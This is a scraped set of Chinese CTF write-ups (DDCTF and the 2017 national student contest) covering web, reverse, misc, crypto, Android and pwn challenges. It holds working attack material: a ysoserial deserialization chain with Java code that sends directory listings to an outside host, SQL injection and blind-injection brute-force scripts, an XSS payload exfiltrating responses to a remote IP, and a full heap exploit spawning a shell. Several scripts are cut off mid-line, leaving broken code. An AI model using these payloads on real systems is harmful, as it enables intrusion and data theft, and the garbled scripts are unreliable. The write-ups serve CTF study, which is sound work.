生成链接JRMPListener的payloadip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64 此时将第10行生成的代码，直接打到远程即可。然后进而写一下获取文件，以及获取目录的代码。此时拿到文件，无法回显。我们可以用Socket来将文件发送到我们的服务器，然后nc监听端口即可。 // 以下代码使用时，记得压缩到一行。 // 获取目录下内容 java.io.File file =new java.io.File(\"/\"); java.io.File[] fileLists = file.listFiles(); java.net.Socket s = new java.net.Socket(\"eval.com\",8768); for (int i = 0; i 然后操作如下：修改替换开启监听端口建议采用ceye的dnslog查看执行时合并为一行，为了好看，我换了下行 java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 CommonsBeanutils1 'code:{{javapayload}}' 生成链接JRMPListener的payload ip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64监听端口数据 nc -lnvp 2333 此时将第10行生成的代码，直接打到远程即可。 p.s. /flag是个文件夹 Reverse 作者：admin-琴里、impakho Cofused 这个文件下载下来是app的安装包然后再安装包里发现了一个叫xia0Crackme文件然后我们拖到IDA里面查找字符串交叉引用来到关键函数函数都标有注释（震惊！出题人果然是一个良好的大佬）程序验证了前六位是不是”DDCTF{“以是不是”}”然后把中间的字符串当做参数传到sub_1000011D0函数里如果这个函数的返回值等于1的话这个flag则正确 然后sub_1000011D0函数中首先是初始化了一个区域：v2Sub_100001f60是通过输入的字符串和内存数据对v2进行赋值操作前段是对v2进行赋值，最后将输入的字符串拷贝到qword_100003F58+48的位置 sub_100001F00函数对(*v2+24)进行赋值把一段数据赋给了他，然后是一个循环判断条件就是刚刚赋值的数据是不是等于“0xf3” 然后我们进入sub_100001E50这个函数是控制程序执行的vm的分支 跳转的分支就是刚刚给v2赋值的函数地址 sub_100001D70：相当于给一个寄存器赋值的操作然后sub_100001A60：异或操作ub_100001AA0：对操作后的字符和输入的字符进行比较sub_100001CB0：加操作sub_100001CF0：减操作sub_100001B10:设置判断是否正确标志位sub_100001D30：赋值操作 sub_100001C60：对内存中的数据进行操作两种运算:A～Z和a～z具体数据： 0xf0,0x10,0x66,0x0,0x0,0x0, 0xf8, 0xf2,0x30, 0xf6,0xc1, 0xf0,0x10,0x63,0x0,0x0,0x0, 0xf8, 0xf2,0x31, 0xf6,0xb6, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x32, 0xf6,0xab, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x33, 0xf6,0xa0, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x34, 0xf6,0x95, 0xf0,0x10,0x57,0x0,0x0,0x0, 0xf8, 0xf2,0x35, 0xf6,0x8a, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x36, 0xf6,0x7f, 0xf0,0x10,0x73,0x0,0x0,0x0, 0xf8, 0xf2,0x37, 0xf6,0x74, 0xf0,0x10,0x45,0x0,0x0,0x0, 0xf8, 0xf2,0x38, 0xf6,0x69, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x39, 0xf6,0x5e, 0xf0,0x10,0x72,0x0,0x0,0x0, 0xf8, 0xf2,0x3a, 0xf6,0x53, 0xf0,0x10,0x52,0x0,0x0,0x0, 0xf8, 0xf2,0x3b, 0xf6,0x48, 0xf0,0x10,0x66,0x0,0x0,0x0, 0xf8, 0xf2,0x3c, 0xf6,0x3d, 0xf0,0x10,0x63,0x0,0x0,0x0, 0xf8, 0xf2,0x3d, 0xf6,0x32, 0xf0,0x10,0x44,0x0,0x0,0x0, 0xf8, 0xf2,0x3e, 0xf6,0x27, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x3f, 0xf6,0x1c, 0xf0,0x10,0x79,0x0,0x0,0x0, 0xf8, 0xf2,0x40, 0xf6,0x11, 0xf0,0x10,0x65,0x0,0x0,0x0, 0xf8, 0xf2,0x41, 0xf6,0x6, 0xf7,0x1,0x0,0x0,0x0,0xf3 最后可以得到flag：hello******TheFlag DDCTF{hello******TheFlag}(PS:题目作者真是一名优秀的程序员) Reverse 2 作者：impakho查壳，显示 ASPack ，用工具脱壳。上 IDA 分析。sub_11D11F0 函数判断输入的字符串是否在 0-9,A-F 的范围内，并且长度是否为偶数。sub_11D1240 函数是一个 hex2bin 的转换。sub_11D1000 函数是一个 base64 编码的过程，编码结果再异或 0x76。编码表为 byte_11D3020。 贴上解密脚本： enc='reverse+' dec1='' table='373435323330313E3F3C3D3A3B383926272425222320212E2F2C171415121310111E1F1C1D1A1B181906070405020300010E0F0C46474445424340414E4F5D59'.decode('hex') dec2=[] flag='' for i in enc: dec1+=chr(ord(i)^0x76) for i in dec1: dec2.append(table.index(i)) for i in range(2): a=dec2[4*i+0] b=dec2[4*i+1] c=dec2[4*i+2] d=dec2[4*i+3] flag+=chr((a>4)) flag+=chr(((b>2)) flag+=chr(((cFlag: DDCTF{AD******C7BE} MISC 作者：admin-琴里、impakho wireshark 我们得到流量包，分析流量包并未发现敏感信息。 。。然后，就试着导出文件 得到：并未有任何发现。。 然后，就试着再次分析流浪包。 在追踪流时发现多个图片。又发现了一个解密网站。。。把图片手动导出。。。 （16进制工具） 得到：发现了钥匙。。。然后就是获得key发现图片钥匙头朝下。。。猜测可能隐藏高度：把高度改为07 50，得到keykey:57pmYyWt然后在线解密就得到flag了。 MulTzor 流量分析。关键点在 HTTP 里。这里上传了两张图片，可以导出来得到 upload.png 和 interesting.png。upload.png 在 MacOS 和 Kali 下都无法预览，想到应该是图片尺寸被修改，根据 PNG 头部的 CRC 爆破图片尺寸，图片尺寸修复脚本如下。 import os import binascii import struct misc = open(\"upload.png\",\"rb\").read() for i in range(1024): data = misc[12:20] + struct.pack('>i',i) + misc[24:29] crc32 = binascii.crc32(data) & 0xffffffff if crc32 == struct.unpack('>i',misc[29:33])[0]: print i data = misc[0:20] + struct.pack('>i',i) + misc[24:] open('upload_repaire.png','wb').write(data) 看到有个 Key: xS8niJM7 ，结合流量包里访问过的 在线图片隐写网址 ，可以在线解密出 interesting.png 里隐写的内容。Flag: DDCTF{NbuiBUlR5l*****fpEmueZd64OlRJ1D2} 北京地铁 提示：AES ECB密钥为小写字母 提示2：密钥不足位用\\0补全 提示3：不要光记得隐写不看图片本身啊... 根据题目提示，查隐写，在 LSB 里找到一串 base64 编码的字符串，应该是 AES 的密文。进一步根据 Color Threshold 提示，用 PhotoShop 调整图片的阀值，找到 北京地铁线路图 上某一站点的颜色不一样，这个站点的 小写拼音字母 为加密密钥。 from Crypto.Cipher import AES from base64 import * cipher=b64decode('7SsQWmZ524i/yVWoMeAIJA==') key='weigongcun'.ljust(16,'\\x00') mode=AES.MODE_ECB c=AES.new(key, mode) print c.decrypt(cipher) Flag: DDCTF{Q****@B0} 联盟决策大会 以下为使用到的7个十六进制常数： p = C45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627 E3ED40FBDE968251984513ACC2B627B4A483A6533 组织1成员1 = 729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB17 77357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E 组织1成员2 = 478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C 24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6 组织1成员4 = BFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB 5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D 组织2成员3 = 9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A 0A494BE36CEF44ADE376317E7A0C70633E3091A61 组织2成员4 = 79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393F C7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8 组织2成员5 = 2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472 444A3CE2368E5A6EBF96603B3CD10EAE858150510 根据题目提示，在维基百科上可以找到 Shamir算法 的解密脚本。使用 组织1成员1 & 组织1成员2 & 组织1成员4 & p，可以解密得到 组织1密文。使用 组织2成员3 & 组织2成员4 & 组织2成员5 & p，可以解密得到 组织2密文。刚开始想直接将两者进行 xor 处理，应该就能得到明文，其实这样行不通。后来发现将两者拿去进行解密，就可以得到明文了。附上解密脚本： from __future__ import division from __future__ import print_function import random import functools _PRIME = 2**127 - 1 _RINT = functools.partial(random.SystemRandom().randint, 0) def _eval_at(poly, x, prime): accum = 0 for coeff in reversed(poly): accum *= x accum += coeff accum %= prime return accum def make_random_shares(minimum, shares, prime=_PRIME): if minimum > shares: raise ValueError(\"pool secret would be irrecoverable\") poly = [_RINT(prime) for i in range(minimum)] points = [(i, _eval_at(poly, i, prime)) for i in range(1, shares + 1)] return poly[0], points def _extended_gcd(a, b): x = 0 last_x = 1 y = 1 last_y = 0 while b != 0: quot = a // b a, b = b, a%b x, last_x = last_x - quot * x, x y, last_y = last_y - quot * y, y return last_x, last_y def _divmod(num, den, p): inv, _ = _extended_gcd(den, p) return num * inv def _lagrange_interpolate(x, x_s, y_s, p): k = len(x_s) assert k == len(set(x_s)), \"points must be distinct\" def PI(vals): accum = 1 for v in vals: accum *= v return accum nums = [] dens = [] for i in range(k): others = list(x_s) cur = others.pop(i) nums.append(PI(x - o for o in others)) dens.append(PI(cur - o for o in others)) den = PI(dens) num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p) for i in range(k)]) return (_divmod(num, den, p) + p) % p def recover_secret(shares, prime=_PRIME): if len(shares) Flag: DDCTF{vF22holF5hl5*****FZ5kZ1DBdWOGObk} PWN 作者：admin-琴里 Strike 首先，我们读一下整个程序我们可以看到这里buf可以输入0x40个字节查看安全检查，没有canary后面通过调试这里输入可以泄露下面输入password可以看到这里signed 变成了unsigned这里的话 就是一个整形溢出漏洞然后，我们就可以进行栈溢出攻击我们通过第一步泄露libc地址在进行第二部攻击的时候发现这里最后的指令是会困住你的lea esp,[ecx-4]改变了栈地址retn的时候要注意我尝试按照一般的做法直接覆盖是行不通的就只能泄露栈地址然后计算偏移算出libc_base附件给了libc，可以确定onegadget然后通过第二部的栈溢出构造返回为one_gadget就直接shel然后我们就能拿到flag Android 感谢作者：impakho Breaking LEM 提示：The format of the flag is DDCTF{ddctf-android-lorenz-ZFXXXXXX}, where XXXXXX represents a 6-char string comprised of A-Z and 0-9. MAX Attempts Limit is 5 看题目应该是 Lorenz Cipher，上维基百科恶补一番。反编译 APK，找到关键函数在 libhello-libs.so 文件里的： Java_com_didictf_guesskey2019lorenz_MainActivity_stringFromJNI(int a1); 结合动态调试，分析出输入要以 ddctf-android-lorenz- 开头，里面会去除这个开头，然后判断剩下的字符串是否在 A-Z,1-6 范围内，然后拿去做 Lorenz Encrypt，最后加密结果做 5轮sha256 计算，比较结果是否与设定值相同。LEM 初始化时会设置 Pinsettings，也就是轮子的初始值，然后每次转轮生成固定的密钥，有点像 srand 和 rand 产生伪随机数的过程。然后用户输入还经过 TelePrinter 的 Baudot 编码转换。生成的密钥与用户输入进行 xor 处理。完成一次加密需要进行 10轮 这个步骤。根据题目提示，需要交给 LEM 做加密的字符串为 ZFXXXXXX（X 代表的字符在 A-Z,1-6 范围内）。为了省事，在此处下断点读 v4，读 8*10=80 次，把需要用到的密钥读出来。已知明文前面两字节为 ZF，需要爆破后面6字节。写出爆破脚本如下： from hashlib import sha256 target='4b27bd0beaa967e3625ff6f8b8ecf76c5beaa3bda284ba91967a3a5e387b0fa7' table='ABCDEFGHIJKLMNOPQRSTUVWXYZ123456' key=[0x9,0x17,0x16,0x3,0x12,0xB,0x1B,0x0,0x4,0x10,0x19,0x5,0x17,0x1D,0x17,0x18,0x18,0x19,0xE,0x3,0x8,0x8,0x18,0xD,0x1E,0x9,0x19,0x1E,0x13,0x0,0x1E,0x1F,0x5,0x11,0x1A,0xD,0x17,0xF,0x1C,0x7,0x1B,0xA,0x8,0x9,0x7,0x1F,0x17,0xA,0xF,0x1F,0x4,0xD,0x18,0xE,0xB,0xB,0x12,0x4,0x3,0xD,0xD,0x4,0x5,0x1D,0xE,0x11,0x8,0x5,0x15,0x1C,0x7,0x1E,0x14,0x9,0x1F,0x2,0xD,0xE,0xA,0x19] tele=[3,25,14,9,1,13,26,20,6,11,15,18,28,12,24,22,23,10,5,16,7,30,19,29,21,17,0,4,8,2,27] flag='ZF' enc='' for i in range(2): tmp=tele[table.index(flag[i])] for j in range(10): tmp^=key[j*8+i] enc+=table[tele.index(tmp)] print enc i=0 succ=0 for a in table: for b in table: for c in table: for d in table: for e in table: for f in table: if i%100000==0: print float(i)*100/1073741824 tmp=enc+a+b+c+d+e+f res=tmp for k in range(5): res=sha256(res).hexdigest() i+=1 if res==target: print tmp enc=tmp succ=1 break if succ==1: break if succ==1: break if succ==1: break if succ==1: break if succ==1: break flag='' for i in range(8): tmp=tele[table.index(enc[i])] for j in range(10): tmp^=key[j*8+i] flag+=table[tele.index(tmp)] print 'DDCTF{ddctf-android-lorenz-%s}' % flag 跑大概一个小时左右，就能跑到 Flag 了。 Flag: DDCTF{ddctf-android-******-ZFPQETDB} Have Fun 这题真令人头疼。变量名全部经过 Unicode混淆，字符串全部经过 动态解密混淆，关键代码还插了 垃圾指令 导致生成伪代码失败。 尝试动态调试，直接闪退，logcat 显示 loadlibrary 时抛出 has invalid shdr offset/size 错误。上网查了一下，发现 Android >= 7 时开启了诸多对 .so 文件的检测。而这道题的 .so 头部被修改过，所以过不了这个检测。先对 libhwFGfOp0EzktJb.so 进行分析。此处会判断输入长度是否为14字节。然后与 off_2910 进行比较。 off_2910 = @n|ixihPIppqws 再分析一下 smali 代码。发现它会调用到一个外部 dex 文件：assets/Y2xhc3Nlc19kZC5kZXg=。 这里会对用户输入进行 Encode，然后再交由 .so 进行比较。写解密脚本，发现提交答案始终不正确。在这里卡了一段时间，后来重新审计 smali 代码，发现自己还是太年轻了，没玩懂出题人的套路。里面有段代码会动态修改外部 dex 文件，往里面插入一些代码，重新计算头部的校验值，并且生成一个新的 dex 文件，释放到 /sdcard/ 里的一个隐藏文件夹里。新文件名为 dnsmanYUn12M.dex，这个才是真正被调用到的 dex 文件。没理解错的话，整个流程用术语好像是叫作 热修复？那么如何得到新的 dex 文件呢。搞了很久，终于找到一条行得通的办法。由于 .so 被修改了头，直接运行 APK 会闪退，所以注释掉 smali 里 loadlibrary 这一行，重新打包 APK，这样就能不会闪退了。然后点击 Check 的按钮，让它生成新的 dex 文件，并且由于没有 loadlibrary 无法调用外部函数，触发闪退。这样就能从隐藏文件夹里提取出新的 dnsmanYUn12M.vdex 和 dnsmanYUn12M.odex文件。然后手工转成 dnsmanYUn12M.dex 文件，进一步分析。这才是真正的 dex 文件。套路真的深～写解密脚本，一个很简单的解密流程。 enc='@n|ixihPIppqws' flag='' for i in range(len(enc)): flag+=chr(ord(enc[i])^(i+8)) print flag 终于得到 Flag。 Flag: DDCTF{Hg******_Yabbcf} 评论区 请文明评论，禁止广告 "},"articals/2017national.html":{"url":"articals/2017national.html","title":"2017全国信安赛","keywords":"","body":"2017全国大学生信息安全竞赛 题目类型： 类型 年份 难度 官方赛事题 2017 中 题目下载： 暂无 网上公开WP: https://www.anquanke.com/post/id/86431 https://p0sec.net/index.php/archives/107/ https://blog.csdn.net/csu_vc/article/details/78011716 https://blog.csdn.net/aptx4869_li/article/details/80589250 网上公开WP: 暂无 本站备份WP： 作者：FlappyPig web 一.PHP execise 类型：WEB 分值：150分直接就能执行代码，先执行phpinfo(),发现禁用了如下函数 assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm, pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled, pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch, pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait, pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents, file,readfile,opendir,readdir,closedir,rewinddir, 然后通过foreach (glob(\"./*\") as $filename) { echo $filename.\"\"; } glob()函数经常用于disable_function()的绕过，该函数的作用是返回匹配指定模式的文件名或目录。 该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。 列出当前目录，然后再用highlight_file()函数读取flag文件内容即可 此处还可用shou_source函数 web 250 首先通过svn泄露获取到源码，然后观察发现主要部分在login.php这里 11){ echo(\"alert('name too long')\"); }else{ $sql = \"select count(*) from t_info where username = '$name' or nickname = '$name'\"; echo $sql; $result = mysql_query($sql); $row = mysql_fetch_array($result); if ($row[0]){ $_SESSION['hat'] = 'black'; echo 'good job'; }else{ $_SESSION['hat'] = 'green'; } header(\"Location: index.php\"); } } 由index.php中代码: 当$_SESSION['hat'] = 'black';时，在index.php下面就能获取到flag， 但是我们注册时候插入的表是t_user，而这里登陆查询的表是t_info,所以思路就只有想办法在login这里注入，结合login.php分析可知，在login.php中，第5行，但会结果不为空，即可。 因此构造poc 最后构造的payload如下： name=or%0a1=1%0a#'&submit=check 成功获取到flag为flag{good_job_white_hat} 8.Classical 类型：web 分值：300分 题目类似WCTF某原题。 加密代码生成了超递增的sk后，使用sk * mask % N作为pk进行使用。flag被用于选取pk求和得到sum。 是典型的Knapsack problem，使用Shamir Attack进行攻击。在github上有很多此类加密方案的攻击办法： https://github.com/taniayu/merklehellman-lll-attack https://github.com/kutio/liblll https://github.com/sonickun/ctf-crypto-writeups/tree/4c0841a344bc6ce64726bdff4616fe771eb69d1e/2015/plaid-ctf/lazy 攻击方法为首先构造矩阵，通过lllattack求得新的矩阵，选取最短的向量即可。 c=956576997571830839619219661891070912231751993511506911202000405564746186955706649863934091672487787498081924933879394165075076706512215856854965975765348320274158673706628857968616084896877423278655939177482064298058099263751625304436920987759782349778415208126371993933473051046236906772779806230925293741699798906569 pubkey=[（自己去复制吧）] from Crypto.Util.number import long_to_bytes as l2b def create_matrix(pub, c): n = len(pub) i = matrix.identity(n) * 2 last_col = [-1] * n first_row = [] for p in pub: first_row.append(int(long(p))) first_row.append(-c) m = matrix(ZZ, 1, n+1, first_row) bottom = i.augment(matrix(ZZ, n, 1, last_col)) m = m.stack(bottom) return m def is_target_value(V): for v in V: if v!=-1 and v!=1: return False return True def find_shortest_vector(matrix): for col in matrix.columns(): if col[0] == 0 and is_target_value(col[1:]): return col else: continue pub = pubkey c = c m = create_matrix(pub, c) lllm = m.transpose().LLL().transpose() shortest_vector = find_shortest_vector(lllm) print shortest_vector x = \"\" for v in shortest_vector[1:]: if v == 1: x += \"1\" elif v == -1: x += \"0\" print x print hex(int(x,2))[2:-1].decode(\"hex\") #flag{M3k13_he11M4N_1ik3s_1Att1ce} 10.flag bending machine 类型：WEB 分值：300分 进去是一个注册及登陆，经过一番fuzz，认为最有可能是二次注入 例如我注册一个bendawang' or 1=1#和注册一个bendawang' or 1=0#，猜想在查询余额时的语句为 select xxx from xxx where username=bendawang' or 1=1# select xxx from xxx where username=bendawang' or 1=0# 所以很容易知道，如果是第一种情况，后面的or 1=1恒真，也就是查询的结果是整个表的结果，而第二个则是用户名为bendawang的结果，也就是说，猜想查询多个结果时取第一个的话，如果我购买了东西，也就是第一种情况显示的余额是不变的，而第二种情况是会变的。就可以根据这个点来进行二分盲注。 另外需要注意的是，题目过滤了一些关键字，select ,from ,on等，不过可以双写绕过，其中on是最坑的，这是最开始测试union是否被过滤发现的。都可以通过双写就能绕过了。 其它也就没有什么过滤了。 最后爆破出来的表名fff1ag，列名thisi5f14g 爆破flag的脚本如下： import requests import string import random import time import re #fff1ag #thisi5f14g url='http://106.75.107.53:8888/' chars=string.printable[:62]+\"!@#$%^&*()_+-={}\" header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive' } def register(data): result = requests.post(url+\"register.php\",data=data,headers=header) if \"Register success\" in result.content: return True else: return False def check(data): data=data.replace('on','') #print data r=requests.session() content=r.post(url+\"login.php\",data=data,headers=header).content #print content if \"wrong\" in content: raw_input(\"error!!!!!!!!!!!!!!!!!!!!!!\"); balance=int(re.findall('you balance is (.*?)',content)[0]) #print \"balance1:\"+str(balance) r.get(url+'buy.php?id=1') content=r.get(url+'user.php').content balance2=int(re.findall('you balance is (.*?)',content)[0]) #print \"balance2:\"+str(balance2) if balance-2333==balance2: return True else: return False ans=\"\" for i in xrange(1,100): for j in chars: username=str(time.time())+\"' or ord(substr((selonect thisi5f14g froonm fff1ag),%d,1))=%s#\"%(i,ord(j)) #print username password='123' data='user='+username+'&pass='+password if register(data)==True: print i,j if check(data)==True: ans+=j print ans break 截图如下： 14.Guestbook 类型：WEB 分值：400分 首先看csp， default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 然后是沙盒： //sandbox delete window.Function; delete window.eval; delete window.alert; delete window.XMLHttpRequest; delete window.Proxy; delete window.Image; delete window.postMessage; 发现沙盒和之前0ctf一样，csp也允许了unsafe-eval的执行 然后开始测试，经过测试发现link标签啊，location都被过滤替换成hacker。 但是location很容易绕过例如window['locat'+'ion'].href 所以思路和0ctf一样，用一个iframe从其他路径下“借用”一个XMLHttpRequest，来发送请求，大概初始payload如下： window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://106.75.103.149:8888/index.php \", false); xhr.send(); a=xhr.responseText; window['locat'+'ion'].href='http://104.160.43.154:8000/xss/?content='+escape(a); 能够成功获得服务器的返回，但是没有cookie，源码里面也没有flag，通过测试document.referrer，发现这个地址： 首先看csp， default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 最后修正payload如下： 16.方舟计划 类型：WEB 分值：400分 首先扫描发现在注册时手机那一栏存在报错注入 username='ad121212122min'&phone=' or updatexml(1,concat(0x7e,(/*!50001select*/a.name /*!50001from*/(/*!50001select*/ config.* /*!50001from*/ user config limit 0,1) a),0x7e),1)or'&password='admin'=''#&repassword='admin'=''# 可以获得账户密码 登录进去发现是ffpm读取任意文件 然后读取etc/passwd 被过滤了 稍微绕过一下就能读了 得到用户名s0m3b0dy 在其home目录下读取到flag文件 二、REVERSE 2.填数游戏 类型：REVERSE 分值：200分 逆向一看就是个数独游戏，主要就是把原来的9*9找出来 里面有一块初始化数独，那个地方看出来是 他的数独题目就如下一样，然后找个网站解一下， 然后输入时候把存在的项变成0就行 5.apk crack 类型：REVERSE 分值：300分 本题的做法比较取巧，首先使用jeb2打开apk文件，查看验证的关键流程 可以看到，程序在取得了用户输入的字符串后，会调用wick.show方法，这个方法会调用jni中的对应函数，该jni函数会开启反调试并给静态变量A、B赋值success和failed。随后会进入simple.check方法开启验证。 这个验证函数非常长，笔者也没看懂。Simple类中有两个字节数组，一个用于存储输入，把它命名为input；另一个数组初始为空，把它命名为empty。 使用jeb2的动态调试功能，把断点下到00000A7A函数的返回指令处，在手机中输入随意字符并点击确定，程序会断在返回指令处。 此时查看empty数组的值，发现疑似ASCII码的数字，转换过来就是flag flag：clo5er 17.溯源 类型：REVERSE 分值：200分 首先是输入长度为200字节，然后每两个字节转化为1个字节，得到100字节的输出。 根据后面的比较可以知道，这100字节分别为0-99这100个数。后面按照特定的顺序将0所在的位置和其上下左右的某个位置的数进行交换。验证经过交换后的数据刚好是0-99顺序排列。 大体思路是构造输入为0-99，得到交换后的数据，可以知道交换的映射关系，然后反过来根据输出为0-100，求输入。 data = '' for i in range(100): high = i/0x10 low = i%0x10 data += chr(65+high) + chr(65+low) print data #output of 0-99 f = open('./result', 'rb') d = f.read() f.close() from zio import * dict = {} for i in range(100): value = l32(d[i*4:i*4+4]) if value > 100: print hex(value) dict[value] = i data = '' for i in range(100): high = dict[i]/0x10 low = dict[i]%0x10 data += chr(65+high) + chr(65+low) print data 三、PWN 3.easyheap 类型：PWN 分值：200分 在edit的时候可以堆溢出，因为堆中有指针，因此只要覆盖指针即可任意地址读写。 因为开启了PIE，可以通过覆盖指针的最低字节进行泄露。 from threading import Thread from zio import * target = './easyheap' target = ('120.132.66.76', 20010) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != '': io.writeline(d) def create_note(io, size, content): io.read_until('Choice:') io.writeline('1') io.read_until(':') io.writeline(str(size)) io.read_until(':') io.writeline(content) def edit_note(io, id, size, content): io.read_until('Choice:') io.writeline('2') io.read_until(':') io.writeline(str(id)) io.read_until(':') io.writeline(str(size)) io.read_until(':') io.write(content) def list_note(io): io.read_until('Choice:') io.writeline('3') def remove_note(io, id): io.read_until('Choice:') io.writeline('4') io.read_until(':') io.writeline(str(id)) def exp(target): io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green')) create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #0 create_note(io, 0xa0, 'b'*0x90) #1 create_note(io, 0xa0, 'c'*0x90) #2 create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #3 remove_note(io, 2) edit_note(io, 0, 0xb9, 'a'*0xb0+l64(0xa0)+'xd0') list_note(io) io.read_until('id:1,size:160,content:') leak_value = l64(io.readline()[:-1].ljust(8, 'x00')) base = leak_value - 0x3c4b78 system = base + 0x0000000000045390 free_hook = base + 0x00000000003C67A8 edit_note(io, 0, 0xc0, 'a'*0xb0+l64(0xa0)+l64(free_hook)) edit_note(io, 1, 8, l64(system)) print hex(system) print hex(free_hook) remove_note(io, 3) interact(io) exp(target) 9.BabyDriver 类型：pwn 分值：450分 0x00 前言 首先题目给了一套系统环境，利用qemu启动，nc连接比赛环境后会得到一个低权限的shell，同时题目给了一个babyDriver.ko，通过insmod将驱动加载进系统，先进行环境搭建，我们使用的是qemu，根据题目给的boot.sh可以得到qemu的启动命令。 qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores=1,threads=1 -cpu kvm64,+smep 这里需要提的一点是很多人都是虚拟机里的Linux安装的qemu，这里有可能会报一个KVM的错误，这里需要开启虚拟机/宿主机的虚拟化功能。 http://p0.qhimg.com/t01b4e7c9581908c7d5.png 启动后我们可以进入当前系统，如果要调试的话，我们需要在qemu启动脚本里加一条参数-gdb tcp::1234 -S，这样系统启动时会挂起等待gdb连接，进入gdb，通过命令 Target remote localhost:1234 Continue 就可以远程调试babyDriver.ko了。 0x01 漏洞分析 通过IDA打开babyDriver.ko，这个驱动非常简单，实现的都是一些基本功能 关于驱动通信网上有很多介绍，这里我不多介绍了，这个驱动存在一个伪条件竞争引发的UAF漏洞，也就是说，我们利用open(/dev/babydev,O_RDWR)打开两个设备A和B，随后通过ioctl会释放掉babyopen函数执行时初始化的空间，而ioctl可以控制申请空间的大小。 __int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, __int64 a4) { _fentry__(filp, command, arg, a4); v5 = v4; if ( (_DWORD)command == 65537 )//COMMAND需要为0x10001 { kfree(babydev_struct.device_buf);//释放初始化空间 LODWORD(v6) = _kmalloc(v5, 37748928LL);//申请用户可控空间 babydev_struct.device_buf = v6; babydev_struct.device_buf_len = v5; printk(\"alloc donen\", 37748928LL); result = 0LL; } else { printk(&unk_2EB, v4); result = -22LL; } return result; } 所以这里我们申请的buffer可控，再仔细看write和read函数，都做了严格的判断控制，似乎漏洞不在这里。 if ( babydev_struct.device_buf )//判断buf必须有值 { result = -2LL; if ( babydev_struct.device_buf_len > v4 )//判断malloc的空间大小必须大于用户读写空间大小 正如之前所说，这个漏洞是一个伪条件竞争引发的UAF，也就是说，我们通过open申请两个设备对象A和B，这时候释放设备对象A，通过close关闭，会发现设备对象B在使用设备对象A的buffer空间。这是因为A和B在使用同一个全局变量。 因此，释放设备A后，当前全局变量指向的空间成为释放状态，但通过设备对象B可以调用write/read函数读写该空间的内容。 我们就能构造一个简单的poc，通过open申请设备对象A和B，ioctl对A和B初始化一样大小的空间，通过kmalloc申请的空间初始化后都为0，随后我们通过close的方法关闭设备对象A，这时候再通过write，向设备对象B的buffer写入。 首先会将buffer的值交给rdi，并且做一次检查。 .text:00000000000000F5 ; 7: if ( babydev_struct.device_buf ) .text:00000000000000F5 mov filp, cs:babydev_struct.device_buf .text:00000000000000FC test rdi, rdi .text:00000000000000FF jz short loc_125 rdi寄存器存放的就是buffer指针。 可以看到，指针指向的空间的值已经不是初始化时候覆盖的全0了。 当前目标缓冲区内已经由于释放导致很多内容不为0，这时候，我们同样可以通过read的方法读到其他地址，获取地址泄露的能力。 在test之后泄露出来了一些额外的值，因此可以通过read的方法来进行info leak。 0x02 Exploit 